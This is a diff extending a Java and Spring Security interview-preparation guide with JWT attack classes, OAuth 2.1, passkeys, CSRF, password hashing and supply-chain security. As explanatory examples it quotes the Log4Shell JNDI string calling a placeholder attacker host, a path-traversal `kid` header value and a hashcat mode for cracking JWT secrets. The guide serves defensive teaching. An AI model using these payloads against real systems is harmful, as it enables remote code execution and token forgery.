@@ -1,5 +1,7 @@
 # Security for Java Applications — Senior Engineer Interview Preparation
 
+> **April 2026 context.** This guide targets Java 24/25 and Spring Security 6.5.x / 7.0.x. Key recent events: Security Manager **permanently disabled** in Java 24 ([JEP 486](https://openjdk.org/jeps/486)), Key Derivation Function API added ([JEP 478](https://openjdk.org/jeps/478), finalized in JEP 510), post-quantum primitives ML-KEM / ML-DSA shipped ([JEP 496](https://openjdk.org/jeps/496), [JEP 497](https://openjdk.org/jeps/497)), hybrid PQ TLS 1.3 in progress ([JEP 527](https://openjdk.org/jeps/527)), OWASP Top 10 **2025 edition** released November 2025, and OAuth 2.1 now standard for new deployments. `WebSecurityConfigurerAdapter` has been gone since Spring Security 5.8 — all configs are component-based (`SecurityFilterChain` + lambda DSL).
+
 ---
 
 ## 1. Authentication vs Authorization
@@ -17,6 +19,23 @@ Authentication is the process of **verifying identity** — confirming that a us
 | Something you **are** | Biometric characteristics | Fingerprint, face recognition, retinal scan |
 
 **Multi-Factor Authentication (MFA)** requires two or more factors from different categories. Using a password + security question is NOT true MFA (both are "something you know").
+
+**Phishing-resistant MFA** (NIST SP 800-63B rev 4, 2025) is now the required bar for high-assurance environments. SMS and TOTP are phishable through real-time proxies (evilginx, Modlishka) and are being deprecated. Passkeys / FIDO2 security keys / platform authenticators are the 2026 standard — see section 5.
+
+### Threat Modeling (STRIDE)
+
+Before writing any auth code, a senior engineer models threats. **STRIDE** is the most widely used lightweight framework — each letter maps to a category of threat and a corresponding security property:
+
+| Threat | Violates | Example | Mitigation |
+|--------|----------|---------|------------|
+| **S**poofing | Authentication | Logging in as another user | Passkeys, MFA, signed tokens |
+| **T**ampering | Integrity | Modifying a request body in flight | HMAC, TLS, JWT signatures |
+| **R**epudiation | Non-repudiation | "I never placed that order" | Immutable audit logs, signed transactions |
+| **I**nformation Disclosure | Confidentiality | Leaking PII via verbose errors | Encryption at rest/transit, error sanitization |
+| **D**enial of Service | Availability | Exhausting connection pool | Rate limiting, timeouts, bulkheads |
+| **E**levation of Privilege | Authorization | User reaches an admin endpoint | Least privilege, `@PreAuthorize`, tenant checks |
+
+Complement with **OWASP Threat Dragon** or **Microsoft Threat Modeling Tool** for data-flow diagrams. For senior interviews you should be able to walk through STRIDE for a given system design on a whiteboard.
 
 ### Authorization ("What can you do?")
 
@@ -86,6 +105,30 @@ public void updateDocument(Document document) { ... }
 
 Spring Security is a powerful framework built around the **Servlet Filter** mechanism. Every HTTP request passes through a chain of security filters before reaching the controller.
 
+### Spring Security 6.x / 7.x — What Changed
+
+Senior engineers are expected to know these modernization milestones — coming from a Spring Security 4/5 codebase is a common migration project:
+
+| Change | Removed / Deprecated | Replacement |
+|--------|---------------------|-------------|
+| **`WebSecurityConfigurerAdapter`** | Removed in 6.0 (deprecated 5.7, gone 5.8) | Expose a `SecurityFilterChain` bean and (optionally) a `WebSecurityCustomizer` bean |
+| **`.antMatchers()` / `.mvcMatchers()` / `.regexMatchers()`** | Removed in 6.0 | `.requestMatchers(...)` auto-selects MVC vs ant matching |
+| **`.authorizeRequests()`** | Removed in 6.0 | `.authorizeHttpRequests()` uses the new `AuthorizationFilter` and `AuthorizationManager` |
+| **`AccessDecisionManager` / `AccessDecisionVoter`** | Removed | `AuthorizationManager<T>` (lambda-friendly, returns `AuthorizationDecision`) |
+| **`FilterSecurityInterceptor`** | Replaced | `AuthorizationFilter` |
+| **`@EnableGlobalMethodSecurity`** | Deprecated | `@EnableMethodSecurity` (pre/post is enabled by default, uses AOT-compatible proxies) |
+| **Builder-style chaining (no lambdas)** | Deprecated in 7.x | **Lambda DSL** is mandatory in 7.0 — builder methods like `http.csrf().disable().and().cors()...` are gone |
+| **`requestMatchers(...).hasRole(...)` on role with `ROLE_` prefix** | Confusing | Use `.hasRole("ADMIN")` (prefix added automatically) or `.hasAuthority("ROLE_ADMIN")` (exact match) |
+| **HttpSecurity defaults for CSRF on stateless APIs** | Still enabled by default | Must be explicitly `.csrf(c -> c.disable())` for JWT APIs (or migrate to `CsrfTokenRequestAttributeHandler` + SPA cookie pattern) |
+
+**Spring Security 6.5 (2025) / 7.0 (2026) highlights** relevant to senior interviews:
+- **OAuth 2.0 DPoP** (Demonstrating Proof of Possession) — sender-constrained tokens that cryptographically bind an access token to a client-held private key. Defeats bearer-token theft.
+- **PKCE for confidential clients** — `ClientRegistration.clientSettings.requireProofKey=true` is now a one-liner.
+- **Passkeys / WebAuthn DSL** — first-class `http.webAuthn(...)` configurer with customizable `HttpMessageConverter`.
+- **Micrometer context propagation** — the SecurityContext is now propagated automatically across reactive/virtual-thread boundaries via the Micrometer Context Propagation library.
+- **Observability key rename** — `security.security.reached.filter.section` → `spring.security.reached.filter.section` (fix if you have Grafana dashboards).
+- **`AuthorizationManager`** is the extension point for custom authz: return `new AuthorizationDecision(boolean)` from a `check(Supplier<Authentication>, T)` method and plug in via `.access(myAuthzManager)`.
+
 ### SecurityFilterChain
 
 The `SecurityFilterChain` is an ordered pipeline of filters that processes each request. Spring Security registers a `DelegatingFilterProxy` that delegates to a `FilterChainProxy`, which manages one or more `SecurityFilterChain` instances.
@@ -130,6 +173,15 @@ Storage strategies:
 - `MODE_THREADLOCAL` (default) — each thread has its own context
 - `MODE_INHERITABLETHREADLOCAL` — child threads inherit parent's context
 - `MODE_GLOBAL` — all threads share one context (rarely used)
+
+**Virtual threads and reactive flows.** `ThreadLocal` behaves exactly as expected on virtual threads (Project Loom, Java 21+), but it is *cheap* there — each virtual thread has its own copy. More interesting: in Spring 6.1+ / Spring Security 6.5+, propagation across reactive boundaries is handled by the **Micrometer Context Propagation** library, so the `Reactor` / virtual-thread scheduler boundaries no longer drop the `SecurityContext`. For WebFlux use `ReactiveSecurityContextHolder.getContext()` which returns a `Mono<SecurityContext>` — never call the servlet `SecurityContextHolder` inside a reactive chain.
+
+```java
+// Reactive access (WebFlux)
+Mono<String> username = ReactiveSecurityContextHolder.getContext()
+    .map(SecurityContext::getAuthentication)
+    .map(Authentication::getName);
+```
 
 ### Authentication Interface
 
@@ -428,13 +480,33 @@ HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
 
 ### Common JWT Mistakes
 
-1. **Storing sensitive data in the payload** — JWTs are encoded, not encrypted. Anyone can decode the payload.
+1. **Storing sensitive data in the payload** — JWTs are encoded, not encrypted. Anyone can decode the payload. Use JWE (JSON Web Encryption) if you must carry secrets.
 2. **Not validating the signature** — always verify; never trust unverified tokens.
 3. **Not checking `exp`** — expired tokens must be rejected.
 4. **Not validating `iss` and `aud`** — prevents token confusion attacks between services.
-5. **Using `alg: none`** — some libraries accept unsigned tokens if the algorithm is "none". Always enforce the expected algorithm.
+5. **Using `alg: none`** — some libraries accept unsigned tokens if the algorithm header is `"none"`. Always enforce the expected algorithm server-side (allowlist, not blocklist).
 6. **Symmetric keys that are too short** — HMAC keys should be at least 256 bits.
 7. **Transmitting tokens over HTTP** — always require HTTPS.
+8. **Trusting the `alg` header** — never use the algorithm declared in the token to pick the verification key. Configure the algorithm on the verifier.
+
+### JWT Attack Classes (senior-level)
+
+| Attack | Mechanism | Mitigation |
+|--------|-----------|-----------|
+| **`alg: none`** | Library accepts `"alg": "none"` and treats the token as unsigned | Configure verifier with explicit algorithm allowlist; never accept `none` in production |
+| **Algorithm confusion (RS256 → HS256)** | Server's RSA public key is submitted back as an HMAC secret. Attacker signs a forged token with `alg=HS256` using the server's public RSA key. Since the library's generic `verify()` uses the same key for both algorithms, the signature validates | Always pin the expected algorithm at the verifier; keep algorithm-specific verifier APIs; never expose the JWKS public key as the symmetric HMAC key. See CVE-2023-48223, CVE-2023-48238 |
+| **`kid` header injection** | `kid` points to `../../../dev/null` (empty file equals empty HMAC key) or performs SQL injection when loading keys | Treat `kid` as an opaque identifier; validate against a fixed allowlist of key IDs from a JWKS |
+| **`jku` / `x5u` poisoning** | Token header points the verifier at an attacker-controlled JWKS URL | Never follow `jku`/`x5u`; load the JWKS from a configured trusted URL only |
+| **Weak HMAC secret** | `secret`, `password`, `changeme` — brute-forceable offline with `hashcat -m 16500` | Use 256+ bit random secrets; rotate from a secrets manager; prefer RS256/ES256 for anything distributed |
+| **Replay (no `jti`, no nonce)** | Same token replayed against different services | Short `exp`, unique `jti`, token revocation list, or DPoP / mTLS binding |
+| **Cross-tenant confusion** | Token issued for tenant A is accepted by tenant B's service | Always validate `iss`, `aud`, and tenant claims |
+
+### Key Management
+
+- **Never hardcode secrets.** Load HMAC/RSA/EC keys from Vault, AWS Secrets Manager, or KMS.
+- **Rotate signing keys** via a JWKS with multiple `kid` entries — publish the new key, let services pick it up, then sign with it, then retire the old key after max token TTL has elapsed.
+- **Use RS256 / ES256 / EdDSA (Ed25519)** for distributed systems. Keep the private key on the authorization server only; resource servers fetch the JWKS. ES256 and EdDSA give the same security as RS256 with much smaller keys and signatures.
+- **Cache JWKS responses** but respect `Cache-Control` and refresh on unknown `kid` (otherwise you bounce users during rotation).
 
 ### JWT Creation and Validation Example
 
@@ -517,7 +589,21 @@ public class JwtTokenProvider {
 
 ---
 
-## 4. OAuth 2.0
+## 4. OAuth 2.0 / OAuth 2.1 / OpenID Connect
+
+### OAuth 2.1 — The Consolidation (what you need to know in 2026)
+
+OAuth 2.1 is a **Best Current Practice consolidation** of OAuth 2.0 + a decade of security guidance (RFC 6749, 6750, 7636, 8252, 8628, 9068, 9126). It is still in late-stage IETF draft but is already what every modern authorization server (Auth0, Keycloak, Okta, Azure AD, Cognito) implements and what new systems should target.
+
+| Change | OAuth 2.0 | OAuth 2.1 |
+|--------|-----------|-----------|
+| **PKCE** | Optional, only required for public clients | **Required for all clients**, including confidential ones |
+| **Implicit grant (`response_type=token`)** | Allowed | **Removed** |
+| **Resource Owner Password Credentials grant** | Allowed | **Removed** |
+| **Redirect URI matching** | Allowed partial match / wildcards | **Exact string match required** (no wildcards) |
+| **Bearer tokens in query strings** | Allowed | **Prohibited** (`Authorization: Bearer` header only) |
+| **Refresh token rotation** | Recommended | Required for public clients; SHOULD for confidential |
+| **Public client secrets** | Sometimes embedded | Not used — PKCE replaces client secrets for public clients |
 
 ### Roles
 
@@ -610,6 +696,46 @@ OIDC is an **identity layer on top of OAuth 2.0**. OAuth 2.0 alone is about auth
 - Defines a `/userinfo` endpoint for fetching user profile data
 - Discovery document at `/.well-known/openid-configuration`
 
+**ID token validation checklist:**
+1. Signature verifies against a key from the OP's JWKS (match on `kid`)
+2. `iss` equals the expected OpenID Provider
+3. `aud` contains this client's `client_id`
+4. `exp` is in the future, `iat` is recent
+5. `nonce` (passed in the auth request) matches what was sent
+6. If `at_hash` / `c_hash` are present, they validate the companion access/code
+7. `acr` / `amr` meet the required authentication context (e.g., MFA was actually performed)
+
+### Sender-Constrained Tokens: DPoP and mTLS
+
+Bearer tokens are vulnerable to theft — anyone who gets the string can use it. Modern OAuth deployments bind tokens to a specific client:
+
+- **mTLS-bound tokens (RFC 8705)** — the access token carries a `cnf` claim with the hash of the client's TLS certificate; the resource server requires the same cert to present the token.
+- **DPoP (RFC 9449)** — "Demonstrating Proof of Possession". Client generates an ephemeral key pair, signs a DPoP proof JWT per request (`htm`, `htu`, `iat`, `jti`, nonce), and the access token's `cnf.jkt` thumbprint must match the DPoP key. Spring Security 6.5 added first-class DPoP support on the resource server side; 7.x extends it to the authorization-server side via Spring Authorization Server.
+
+Use DPoP for browser-based SPAs where mTLS is impractical, mTLS for service-to-service.
+
+### The `state` Parameter and CSRF on OAuth Flows
+
+Overlooked by juniors, tested by senior interviewers. The authorization code flow itself is vulnerable to CSRF — an attacker can trick a victim into completing a login with the attacker's account, then inject their own code into the victim's callback. The fix:
+
+- Client generates a cryptographically random `state` before the authorization request, stores it in the user's session
+- Authorization server reflects `state` back on the redirect to the `redirect_uri`
+- Client rejects the callback if the returned `state` does not match session
+
+OAuth 2.1 makes PKCE universal, and PKCE's `code_verifier` check covers most of the same attack — but `state` is still mandatory because PKCE runs after the callback has already been accepted. Treat `state` + `nonce` (for OIDC) + PKCE as the three-layer defense. Spring Security's `oauth2Login()` and `oauth2Client()` handle all three automatically; if you hand-roll a client, do not skip any.
+
+### Hardened Authorization Requests: PAR, JAR, JARM
+
+For high-assurance deployments (banking, government, open banking standards like FAPI 2.0), the plain authorization request is further hardened:
+
+| Mechanism | RFC | What it does |
+|-----------|-----|--------------|
+| **PAR** (Pushed Authorization Requests) | RFC 9126 | Client pushes request parameters to a backchannel `/par` endpoint, receives a `request_uri`, then redirects the user-agent with only that opaque reference. No sensitive params ever touch the front channel |
+| **JAR** (JWT-Secured Authorization Request) | RFC 9101 | The request object is a signed (and optionally encrypted) JWT. Prevents parameter tampering between the user agent and the authorization server |
+| **JARM** (JWT-Secured Authorization Response Mode) | OpenID Foundation spec | The authorization response (the redirect back to the client) is itself a signed JWT — detects tampering with `code`, `state`, or error params |
+
+FAPI 2.0 baseline requires PAR + sender-constrained tokens (mTLS or DPoP) + PKCE. Spring Authorization Server 1.5+ supports PAR, JAR, and DPoP out of the box.
+
 ### Token Introspection vs JWT Validation
 
 | Approach | How it works | Pros | Cons |
@@ -668,7 +794,83 @@ spring:
 
 ---
 
-## 5. CORS (Cross-Origin Resource Sharing)
+## 5. Passkeys and WebAuthn (Passwordless, Phishing-Resistant MFA)
+
+### Why Passkeys Matter in 2026
+
+Passwords + SMS OTP + TOTP are all **phishable** — an attacker-in-the-middle page can relay credentials in real time. **Passkeys** (W3C WebAuthn / FIDO2) replace the password with a public-private key pair that is bound to the *origin* of the relying party, making phishing structurally impossible: the browser refuses to sign a challenge for a different domain.
+
+- Private key stays in the authenticator (Secure Enclave, TPM, YubiKey) and never leaves
+- The server stores only the public key
+- Authentication is a signed challenge per login — no replayable shared secret
+- Synced passkeys (iCloud Keychain, Google Password Manager, 1Password, Windows Hello) give users cross-device portability without the security penalty of passwords
+
+Senior engineers in 2026 are expected to know that **passkeys are the default password replacement** in new systems and that most auth providers (Auth0, Okta, Keycloak 24+) support them natively.
+
+### Ceremony Overview
+
+**Registration:**
+1. Server generates challenge, sends it with `user.id`, allowed algorithms, authenticator criteria
+2. Browser asks authenticator to create a key pair bound to the origin + `rp.id`
+3. Authenticator returns `attestationObject` + `clientDataJSON` signed by the newly created key
+4. Server verifies, stores the public key + credential ID + sign counter
+
+**Authentication:**
+1. Server sends challenge + list of credential IDs for the user
+2. Browser asks authenticator to sign the challenge with the matching private key
+3. Server verifies the signature against the stored public key, checks counter monotonically increased
+
+### Spring Security WebAuthn DSL (6.5+)
+
+Spring Security 6.5 shipped a first-class `webAuthn()` configurer. Minimum wiring:
+
+```java
+@Bean
+public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    return http
+        .formLogin(Customizer.withDefaults())
+        .webAuthn(webAuthn -> webAuthn
+            .rpName("My App")
+            .rpId("example.com")                  // must match eTLD+1 of the site
+            .allowedOrigins("https://example.com"))
+        .build();
+}
+
+// Custom credential repository (default is in-memory; override for production)
+@Bean
+public UserCredentialRepository userCredentialRepository(
+        PublicKeyCredentialRepository repo) {
+    return new JpaUserCredentialRepository(repo); // your JPA impl
+}
+```
+
+Spring 6.5 also added an optional `messageConverter` property on the `webAuthn` DSL for custom JSON serialization and a pluggable `PublicKeyCredentialCreationOptionsRepository` for storing registration state across nodes (use Redis in a clustered environment).
+
+### Attestation: When to Verify, When to Skip
+
+Attestation lets the server cryptographically verify *what kind* of authenticator enrolled. Three modes:
+
+| Mode | Use case |
+|------|----------|
+| `none` | Consumer apps — accept any authenticator, trust the browser's UV flag |
+| `indirect` | Platform decides (server may get a redacted attestation) |
+| `direct` | Enterprise / regulated — verify against the FIDO Metadata Service (MDS) to allow only approved YubiKey models, etc. |
+
+Use `none` for most consumer SaaS. Use `direct` + FIDO MDS for compliance-bound environments (healthcare, finance).
+
+### Passkey vs Hardware Token Trade-offs
+
+| Authenticator | Phishing-resistant | Hardware-bound | Portable | Best for |
+|---------------|--------------------|----------------|----------|----------|
+| **Synced passkey** (iCloud, Google) | Yes | No (synced) | Yes (same ecosystem) | Consumers, SaaS |
+| **Device-bound passkey** (TPM, Secure Enclave) | Yes | Yes | No | Employee laptops |
+| **Roaming authenticator** (YubiKey) | Yes | Yes | Yes (physical) | Admins, high-value accounts |
+| **TOTP (Google Authenticator)** | No (phishable) | No | Yes | Legacy 2FA — being phased out |
+| **SMS OTP** | No (SIM swap, phishable) | No | Yes | Deprecated by NIST SP 800-63B rev 4 |
+
+---
+
+## 6. CORS (Cross-Origin Resource Sharing)
 
 ### Same-Origin Policy
 
@@ -810,7 +1012,7 @@ public CorsConfigurationSource corsConfigurationSource() {
 
 ---
 
-## 6. Common Java Security Vulnerabilities
+## 7. Common Java Security Vulnerabilities
 
 ### SQL Injection
 
@@ -903,18 +1105,25 @@ Attacker tricks a logged-in user's browser into making unwanted requests to a si
 **Protection strategies:**
 
 ```java
-// Spring Security CSRF protection (enabled by default for form-based apps)
+// Spring Security 6 — SPA-friendly CSRF. Uses the "deferred token" pattern
+// with CookieCsrfTokenRepository + CsrfTokenRequestAttributeHandler
 @Bean
 public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    CookieCsrfTokenRepository tokenRepository = CookieCsrfTokenRepository.withHttpOnlyFalse();
+    CsrfTokenRequestAttributeHandler requestHandler = new CsrfTokenRequestAttributeHandler();
+    // Opt out of BREACH-mitigation header renaming for SPAs that expect X-XSRF-TOKEN
+    requestHandler.setCsrfRequestAttributeName(null);
+
     return http
         .csrf(csrf -> csrf
-            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
-            // For SPAs: token in cookie, include in X-XSRF-TOKEN header
-        )
+            .csrfTokenRepository(tokenRepository)
+            .csrfTokenRequestHandler(requestHandler))
         .build();
 }
 
-// Disable CSRF only for stateless APIs using JWT (no cookies = no CSRF risk)
+// Stateless APIs using JWT in Authorization header — no cookies, no CSRF.
+// (Spring Security still has CSRF enabled by default for POST/PUT/PATCH/DELETE;
+// you MUST disable it explicitly for stateless APIs or all mutations return 403.)
 @Bean
 public SecurityFilterChain apiFilterChain(HttpSecurity http) throws Exception {
     return http
@@ -924,17 +1133,24 @@ public SecurityFilterChain apiFilterChain(HttpSecurity http) throws Exception {
 }
 ```
 
+**Modern Spring Security stance on CSRF (6.x):**
+- CSRF is **still enabled by default** — Spring did *not* turn it off. The 6.x changes were to the token handler (BREACH mitigation) and the deferred-token pattern.
+- `CookieCsrfTokenRepository.withHttpOnlyFalse()` is the SPA pattern: server writes `XSRF-TOKEN` cookie, client JS reads it and echoes it in `X-XSRF-TOKEN` header. Because a cross-origin attacker cannot read the cookie (SameSite) or set custom headers (CORS preflight), this works.
+- **Do not disable CSRF** if you use session cookies for auth, even for JSON APIs — a JSON `fetch()` from a malicious origin without preflight is no longer impossible on exotic setups.
+
 **SameSite cookies** (modern defense):
 ```
 Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
 ```
-- `SameSite=Strict` — cookie never sent on cross-site requests
-- `SameSite=Lax` — cookie sent on top-level navigations (GET) but not POST/forms from other sites
-- `SameSite=None; Secure` — always sent (opt-in for cross-site, requires HTTPS)
+- `SameSite=Strict` — cookie never sent on cross-site requests (logs users out when following external links to your site)
+- `SameSite=Lax` — cookie sent on top-level navigations (GET) but not POST/forms from other sites. **Browser default since 2020.**
+- `SameSite=None; Secure` — always sent cross-site (opt-in, requires HTTPS). Needed for iframed SSO widgets.
+
+Even with `SameSite=Lax`, CSRF tokens are still recommended as defense-in-depth — some browsers have relaxed the default, and not all requests are covered.
 
 ### Deserialization Attacks
 
-Java's `ObjectInputStream` can instantiate arbitrary classes during deserialization, leading to **Remote Code Execution (RCE)**.
+Java's `ObjectInputStream` can instantiate arbitrary classes during deserialization, leading to **Remote Code Execution (RCE)**. Gadget chains in popular libraries (Apache Commons Collections, Spring AOP, Hibernate, Log4j 1.x) allow attackers to build a payload that, when deserialized, triggers `Runtime.exec`. The **canonical answer in 2026 is: do not use Java serialization for untrusted data.** Serialization filtering is a stopgap, not a fix.
 
 **Vulnerable:**
 ```java
@@ -1079,7 +1295,7 @@ public byte[] downloadFile(@RequestParam String filename) throws IOException {
 
 ---
 
-## 7. Password Security
+## 8. Password Security
 
 ### Why Not MD5 or SHA?
 
@@ -1091,9 +1307,18 @@ MD5 and SHA-family hashes are **general-purpose hash functions** designed to be 
 
 | Algorithm | Mechanism | Memory-Hard | Notes |
 |-----------|-----------|-------------|-------|
-| **BCrypt** | Blowfish-based, 128-bit salt | No | Industry standard, well-tested. Default in Spring Security. |
-| **SCrypt** | Sequential memory-hard | Yes | Resistant to GPU/ASIC attacks. Good for high-security needs. |
-| **Argon2** | Winner of Password Hashing Competition (2015) | Yes | Best overall. Argon2id variant recommended (hybrid resistance). |
+| **Argon2id** | Winner of Password Hashing Competition (2015), RFC 9106 | Yes | **Current OWASP #1 recommendation.** Hybrid of Argon2i and Argon2d — resists GPU/ASIC and side-channel. Now a first-class algorithm in the JDK 24+ KDF API (JEP 478). |
+| **scrypt** | Sequential memory-hard | Yes | Good fallback where Argon2 unavailable. Resistant to GPU/ASIC. |
+| **bcrypt** | Blowfish-based, 128-bit salt | No | Still widely deployed, still acceptable at cost ≥ 12. Maximum password length of 72 bytes is a footgun — either reject longer passwords or pre-hash with SHA-256 before bcrypt. |
+| **PBKDF2-HMAC-SHA256** | Iterated HMAC | No | FIPS-approved; use only when compliance requires it (600,000+ iterations in 2025 per NIST SP 800-63B revision 4). Not memory-hard — weak against GPU attacks. |
+| MD5, SHA-1, SHA-256/512 (raw) | Fast general-purpose hash | No | **Never for passwords.** Even salted, brute-forceable at 10+ billion hashes/sec on a consumer GPU. |
+
+### OWASP 2026 Parameter Guidance
+
+- **Argon2id**: m=19 MiB, t=2, p=1 (minimum) — raise to m=64 MiB where latency budget allows
+- **scrypt**: N=2^17, r=8, p=1
+- **bcrypt**: cost ≥ 12
+- **PBKDF2-HMAC-SHA256**: ≥ 600,000 iterations
 
 ### How Salting Works
 
@@ -1121,39 +1346,55 @@ BCrypt cost factor: 2^cost iterations
 
 ### Spring Security PasswordEncoder
 
+The idiomatic 2026 setup uses **`DelegatingPasswordEncoder` with Argon2id as the default** — this lets you upgrade algorithms over time while still verifying legacy hashes. New hashes are prefixed with `{argon2}`; old `{bcrypt}` or `{pbkdf2}` hashes still validate, and `upgradeEncoding()` transparently rehashes on successful login.
+
 ```java
 @Configuration
 public class PasswordConfig {
 
-    // BCrypt — most common, cost factor 12
+    // Preferred — delegating encoder with Argon2id default
     @Bean
     public PasswordEncoder passwordEncoder() {
-        return new BCryptPasswordEncoder(12);
+        // Use the Spring-provided factory; it uses modern OWASP parameters.
+        return PasswordEncoderFactories.createDelegatingPasswordEncoder();
+        // Stored format: {argon2@SpringSecurity_v5_8}$argon2id$v=19$m=16384,t=2,p=1$...
     }
 
-    // Argon2 — strongest option
+    // Explicit Argon2id — tune m/t/p to your hardware (target 100-500ms per hash)
     @Bean
-    public PasswordEncoder argon2Encoder() {
-        return new Argon2PasswordEncoder(
-            16,    // salt length
-            32,    // hash length
-            1,     // parallelism
-            65536, // memory in KB (64MB)
-            3      // iterations
-        );
+    public PasswordEncoder explicitArgon2() {
+        return Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8();
+        // saltLength=16, hashLength=32, parallelism=1, memory=16384 KiB, iterations=2
     }
 
-    // Delegating encoder — supports multiple algorithms for migration
+    // Custom mix with legacy support
     @Bean
-    public PasswordEncoder delegatingEncoder() {
+    public PasswordEncoder migrationEncoder() {
+        String defaultId = "argon2";
         Map<String, PasswordEncoder> encoders = Map.of(
+            "argon2", Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8(),
             "bcrypt", new BCryptPasswordEncoder(12),
-            "argon2", new Argon2PasswordEncoder(16, 32, 1, 65536, 3),
-            "scrypt", SCryptPasswordEncoder.defaultsForSpringSecurity_v5_8()
+            "scrypt", SCryptPasswordEncoder.defaultsForSpringSecurity_v5_8(),
+            "pbkdf2", Pbkdf2PasswordEncoder.defaultsForSpringSecurity_v5_8(),
+            "noop",   NoOpPasswordEncoder.getInstance() // only for test migrations
         );
-        return new DelegatingPasswordEncoder("argon2", encoders);
+        return new DelegatingPasswordEncoder(defaultId, encoders);
     }
 }
+```
+
+### KDF API (JEP 478, JDK 24+)
+
+Java 24 introduced `javax.crypto.KDF` — a first-class API for **Key Derivation Functions** (HKDF today, Argon2 and scrypt added via finalization in JEP 510). This is separate from password hashing (use `PasswordEncoder`) — it is for deriving cryptographic keys from passwords, shared secrets, or other high-entropy material. The API is a building block for Hybrid Public Key Encryption (HPKE) and post-quantum key agreement.
+
+```java
+// Derive a session key from an ECDH shared secret using HKDF-SHA256 (JEP 478)
+KDF hkdf = KDF.getInstance("HKDF-SHA256");
+AlgorithmParameterSpec params = HKDFParameterSpec.ofExtract()
+    .addIKM(sharedSecret)        // input keying material
+    .addSalt(salt)
+    .thenExpand(info, 32);       // info context + 32-byte output
+SecretKey sessionKey = hkdf.deriveKey("AES", params);
 ```
 
 ### BCrypt Usage Example
@@ -1182,7 +1423,7 @@ public class PasswordExample {
 
 ---
 
-## 8. Secrets Management
+## 9. Secrets Management
 
 ### Why Secrets Should Not Be in Code or Config Files
 
@@ -1261,7 +1502,7 @@ The 12-factor methodology says: **store config in the environment**. While envir
 
 ---
 
-## 9. HTTPS / TLS
+## 10. HTTPS / TLS
 
 ### TLS Handshake (TLS 1.3 simplified)
 
@@ -1319,6 +1560,16 @@ How it works:
 4. Server validates client certificate against trusted CA
 5. Both parties are mutually authenticated
 ```
+
+### Zero-Trust Architecture
+
+**"Never trust, always verify"** — NIST SP 800-207. The network perimeter no longer exists; every request is authenticated and authorized on its own merits, regardless of origin. Concretely this means:
+
+- **No implicit intranet trust** — an internal microservice call gets the same token validation as an external one
+- **Short-lived credentials** — workload identities (SPIFFE SVIDs, AWS IRSA, GKE Workload Identity) rotated automatically, no long-lived service account keys
+- **mTLS everywhere** — typically delivered by a service mesh (Istio, Linkerd, Consul Connect) with sidecar-terminated TLS so app code stays unchanged
+- **Policy as code** — authorization decisions centralized in an engine like OPA / Cedar, pulled by each service at runtime
+- **Continuous verification** — session-bound, device-posture-aware (BeyondCorp model): revoke access mid-session if risk signals change
 
 ### Java Keystores and Truststores
 
@@ -1416,7 +1667,7 @@ public class HttpsRedirectConfig {
 
 ---
 
-## 10. Security Headers and Best Practices
+## 11. Security Headers and Best Practices
 
 ### Essential Security Headers
 
@@ -1558,15 +1809,18 @@ Vulnerable dependencies are one of the most common attack vectors. Regularly sca
 | **Snyk** | SaaS + CLI | GitHub integration, PR checks |
 | **GitHub Dependabot** | Built into GitHub | Automatic PRs for updates |
 | **Trivy** | Container scanner | Docker images, IaC |
+| **grype** | SBOM-based SCA | Works with CycloneDX / SPDX |
+| **Sonatype Nexus IQ / JFrog Xray** | Enterprise SCA | Artifact-repo gating |
 
 ```xml
-<!-- Maven: OWASP Dependency-Check plugin -->
+<!-- Maven: OWASP Dependency-Check plugin (v12.x, 2026) -->
 <plugin>
     <groupId>org.owasp</groupId>
     <artifactId>dependency-check-maven</artifactId>
-    <version>9.0.9</version>
+    <version>12.2.0</version>
     <configuration>
         <failBuildOnCVSS>7</failBuildOnCVSS> <!-- Fail on High/Critical -->
+        <nvdApiKey>${env.NVD_API_KEY}</nvdApiKey> <!-- NVD API key required since 2024 -->
     </configuration>
     <executions>
         <execution>
@@ -1578,7 +1832,226 @@ Vulnerable dependencies are one of the most common attack vectors. Regularly sca
 
 ---
 
-## 11. Common Senior Interview Questions
+## 12. Software Supply Chain Security (OWASP A03:2025)
+
+### Why This Became a Top-Level Category
+
+**Log4Shell (CVE-2021-44228, December 2021)** was the watershed. Apache Log4j2 had a JNDI lookup feature in its pattern formatter: any logged string containing `${jndi:ldap://attacker.com/x}` would trigger an LDAP lookup and load an arbitrary remote class — unauthenticated RCE from a single HTTP header. Three factors made it catastrophic:
+1. **Ubiquity** — Log4j was embedded in thousands of products, often as a transitive dependency invisible to dependency scanners that only looked at top-level declarations.
+2. **Ease of exploitation** — any log line with user-controlled input was a trigger; `User-Agent`, `X-Forwarded-For`, and usernames all worked.
+3. **Visibility gaps** — organizations could not answer "where is Log4j running in our stack?" in hours, let alone in the 24 hours they had before mass exploitation.
+
+The follow-on events — **Spring4Shell** (CVE-2022-22965), the **3CX / SolarWinds** build-system compromises, **xz-utils** backdoor (CVE-2024-3094), malicious npm/PyPI typosquats — crystallized the new threat model: **the build system and the dependency graph are now part of the attack surface.**
+
+Practical senior-engineer response:
+- Maintain a real inventory (SBOM) of every production artifact
+- Verify build provenance cryptographically (Sigstore / SLSA)
+- Treat a `log4j` zero-day drill as a routine tabletop exercise
+
+### SBOM (Software Bill of Materials)
+
+An SBOM is a machine-readable list of every component in a build artifact: direct dependencies, transitive dependencies, OS packages, license info, cryptographic hashes, and provenance. The two dominant formats:
+
+| Format | Origin | Strength |
+|--------|--------|----------|
+| **CycloneDX** | OWASP | Lightweight, security-focused, includes vulnerability and VEX data |
+| **SPDX** | Linux Foundation / ISO 5962 | Licensing-focused, required by US federal procurement per EO 14028 |
+
+```xml
+<!-- Maven: CycloneDX SBOM plugin -->
+<plugin>
+    <groupId>org.cyclonedx</groupId>
+    <artifactId>cyclonedx-maven-plugin</artifactId>
+    <version>2.8.0</version>
+    <executions>
+        <execution>
+            <phase>package</phase>
+            <goals><goal>makeAggregateBom</goal></goals>
+        </execution>
+    </executions>
+</plugin>
+```
+
+Pair the SBOM with a scanner like `grype sbom:bom.json` in CI. When the next Log4Shell drops, you answer the "are we affected?" question in minutes by grepping the SBOMs of every deployed service.
+
+### SLSA — Supply-chain Levels for Software Artifacts
+
